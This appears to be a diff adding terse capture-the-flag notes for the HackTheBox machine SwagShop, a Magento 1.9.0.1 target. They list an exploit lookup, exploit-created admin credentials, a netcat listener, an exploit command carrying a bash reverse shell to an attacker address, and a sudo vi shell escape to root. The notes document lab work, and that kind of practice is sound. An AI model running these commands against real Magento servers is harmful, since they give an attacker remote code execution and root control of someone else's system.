@@ -1,0 +1,18 @@
+//based on MinatoTW, IppSec
+magento v1.9.0.1
+searchsploit magento
+Magento eCommerce - Remote Code Execution                                       | xml/webapps/37977.py
+add: #!/usr/bin/env pythonChange:
+
+//change target = "http://target.com/"
+         target = "http://swagshop.htb/index.php"
+python 37977.py
+http://10.10.10.140/index.php/admin
+forme:forme
+
+nc -lvnp 9001
+python3 magento-oneshot.py http://10.10.10.140/index.php --history-length 1y --command 'bash -c "bash -i >& /dev/tcp/10.10.14.16/9001 0>&1"'			https://github.com/epi052/htb-scripts-for-retired-boxes/blob/master/swagshop/magento-oneshot.py
+
+sudo -l
+sudo /usr/bin/vi /var/www/html/*
+:!/bin/sh
